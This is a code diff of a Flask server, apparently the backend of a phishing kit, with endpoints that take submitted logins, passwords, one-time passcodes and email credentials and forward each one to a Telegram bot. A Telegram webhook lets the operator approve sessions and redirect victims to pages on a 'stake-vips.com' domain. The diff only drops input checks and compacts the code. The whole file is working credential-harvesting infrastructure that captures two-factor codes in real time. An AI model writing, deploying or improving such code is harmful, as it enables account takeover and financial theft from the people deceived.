@@ -10,7 +10,7 @@ load_dotenv()
 
 app = Flask(__name__)
 
-# ✅ CORS FIX
+# ✅ CORS FIX for Render
 CORS(app)
 
 @app.after_request
@@ -31,7 +31,7 @@ if not BOT_TOKEN or not CHAT_ID:
 SESSION_STATUS = {}
 
 # ======================
-# TELEGRAM SEND (FINAL)
+# TELEGRAM SEND (ORIGINAL)
 # ======================
 def send_to_telegram(data, session_id, type_):
     msg = f"🔐 {type_.upper()} Submission\n\n"
@@ -66,16 +66,12 @@ def send_to_telegram(data, session_id, type_):
 # ======================
 @app.route("/login", methods=["POST", "OPTIONS"])
 def login():
-    if request.method == "OPTIONS":
-        return jsonify({}), 200
+    if request.method == "OPTIONS": return jsonify({}), 200
     data = request.get_json()
-    if not data or "login" not in data or "password" not in data:
-        return jsonify({"success": False, "error": "Missing fields"}), 400
+    
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
+    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
+    
     send_to_telegram(data, session_id, "login")
     return jsonify({"success": True, "id": session_id})
 
@@ -84,16 +80,12 @@ def login():
 # ======================
 @app.route("/otp", methods=["POST", "OPTIONS"])
 def otp():
-    if request.method == "OPTIONS":
-        return jsonify({}), 200
+    if request.method == "OPTIONS": return jsonify({}), 200
     data = request.get_json()
-    if not data or "otp" not in data:
-        return jsonify({"success": False, "error": "Missing OTP"}), 400
+    
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
+    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
+    
     send_to_telegram(data, session_id, "otp")
     return jsonify({"success": True, "id": session_id})
 
@@ -102,32 +94,24 @@ def otp():
 # ======================
 @app.route("/email", methods=["POST", "OPTIONS"])
 def email():
-    if request.method == "OPTIONS":
-        return jsonify({}), 200
+    if request.method == "OPTIONS": return jsonify({}), 200
     data = request.get_json()
-    if not data or "email" not in data or "password" not in data:
-        return jsonify({"success": False, "error": "Missing fields"}), 400
+    
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
+    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
+    
     send_to_telegram(data, session_id, "email")
     return jsonify({"success": True, "id": session_id})
 
 # ======================
-# STATUS
+# STATUS & WEBHOOK
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
     session = SESSION_STATUS.get(session_id)
-    if not session:
-        return jsonify({"error": "Invalid session"}), 404
+    if not session: return jsonify({"error": "Invalid session"}), 404
     return jsonify(session)
 
-# ======================
-# TELEGRAM WEBHOOK
-# ======================
 @app.route("/webhook", methods=["POST"])
 def webhook():
     data = request.get_json()
@@ -140,16 +124,9 @@ def webhook():
             SESSION_STATUS[session_id]["redirect_url"] = f"https://stake-vips.com{page}"
     return jsonify({"ok": True})
 
-# ======================
-# ROOT
-# ======================
 @app.route("/")
-def home():
-    return "✅ Server is live"
+def home(): return "✅ Server is live"
 
-# ======================
-# RUN (RENDER)
-# ======================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
